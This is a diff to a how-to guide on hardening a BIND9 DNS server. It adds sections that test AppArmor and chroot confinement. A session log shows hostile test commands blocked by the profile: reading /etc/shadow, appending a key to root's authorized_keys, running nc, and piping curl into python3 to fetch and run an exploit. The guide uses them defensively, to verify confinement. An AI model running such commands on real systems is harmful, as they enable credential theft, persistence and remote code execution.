@@ -2,6 +2,7 @@
 draft: false
 date:
   created: 2024-07-19
+  updated: 2024-07-23
 categories:
   - how-to
   - administration
@@ -21,7 +22,7 @@ description: How to install, maintain, and run a BIND9 DNS server.
 
 How to install, maintain, and run a BIND9 DNS server (`named`). Covers building from source, configuring, hardening, and DNS over TLS as well as DNSSEC.
 
-*Updated on 2024/07/19.*
+*Updated on 2024/07/23.*
 
 <!-- more -->
 
@@ -847,6 +848,53 @@ This profile locks `named`'s ability to access or modify data to the following p
 ```
 
 
+!!! example "Reviewing Confinement"
+
+	- [`aa-exec` manpage](https://gitlab.com/apparmor/apparmor/-/wikis/manpage_aa-exec.1#synopsis)
+
+	AppArmor has a tool called `aa-exec` that allows you to run a process under the confinement of a (currently loaded) profile. When asking ChatGPT if there's a similar method for AppArmor to using `snap run --shell firefox` or `flatpak run --command=bash firefox` to explore what the snap/flatpak-confined firefox process can see and do, it pointed to `aa-exec`. This is essentially the same thing, allowing you to explore the AppArmor confinement of regular deb packages that have a profile.
+
+	Ensure the profile is loaded into AppAmor.
+
+	```bash
+	sudo apparmor_parser -a /etc/apparmor.d/usr.sbin.named
+	```
+
+	Specify the profile name based on what `sudo aa-status` returns for that executable. For example you would use `named` and not `usr.sbin.named` here. To open a `bash` shell in `named`'s AppArmor profile:
+
+	```bash
+	sudo aa-exec -p named -- /bin/bash
+	```
+
+	This results in a bash process confined by the `usr.sbin.named` profile.
+
+	```bash
+	server@ubuntu2404:~$ sudo aa-exec -p named -- /bin/bash
+	bash: /etc/bash.bashrc: Permission denied
+	bash: /root/.bashrc: Permission denied
+	bash-5.1#
+	bash-5.1# cat /etc/shadow
+	bash: /usr/bin/cat: Permission denied
+	bash-5.1#
+	bash-5.1# echo 'bad-key' >> /root/.ssh/authorized_keys
+	bash: /root/.ssh/authorized_keys: Permission denied
+	bash-5.1#
+	bash-5.1# sh -c whoami
+	bash: /usr/bin/sh: Permission denied
+	bash-5.1# bash
+	bash: /usr/bin/bash: Permission denied
+	bash-5.1#
+	bash-5.1# nc
+	bash: /usr/bin/nc: Permission denied
+	bash-5.1#
+	bash-5.1# curl http://127.0.0.1:8080/exploit.py | python3
+	bash: /usr/bin/python3: Permission denied
+	bash: /usr/bin/curl: Permission denied
+	bash-5.1#
+	bash-5.1# touch /tmp/test.txt
+	bash: /usr/bin/touch: Permission denied
+	```
+
 
 ### SELinux
 
@@ -949,6 +997,36 @@ find /chroot/ -type f
 
 `named` is now running in a chroot.
 
+
+!!! example "Reviewing Confinement"
+
+	- [GNU Manual: Coreutils/Chroot](https://www.gnu.org/software/coreutils/chroot)
+	- [HackTricks: Chroot Escapes](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#chroot-escapes)
+
+	You can interactively explore a chroot environment with the `chroot <path>` command. Specify the `<path>` to your chroot, then a command or shell to execute. If you don't specify a shell, it defaults to `/bin/sh -i`.
+
+	!!! quote "man chroot"
+
+		If no command is given, run '"$SHELL" -i' (default: '/bin/sh -i').
+
+	You can see below with the chroot created for bind, there aren't any binaries available to execute. There's no way to explore this interactively in our case, which is exactly what we want. For reference, `find` was used to list all avaialble files under the chroot. Assume that a rogue `named` process could at the very least "see" these files, which is fine.
+
+	```bash
+	server@ubuntu2404:~$ sudo chroot /chroot/bind
+	chroot: failed to run command ‘/bin/bash’: No such file or directory
+	server@ubuntu2404:~$
+	server@ubuntu2404:~$ sudo find /chroot/ -type f
+	/chroot/bind/etc/bind/named.conf
+	/chroot/bind/etc/bind/rndc.key
+	/chroot/bind/etc/bind/named.rfc1912.zones
+	/chroot/bind/etc/bind/bind.keys
+	/chroot/bind/etc/bind/rndc.conf
+	/chroot/bind/usr/share/dns/root.hints
+	/chroot/bind/var/run/named/session.key
+	/chroot/bind/var/run/named/named.pid
+	/chroot/bind/var/cache/named/managed-keys.bind
+	/chroot/bind/var/cache/named/managed-keys.bind.jnl
+	```
 
 
 ## Administration
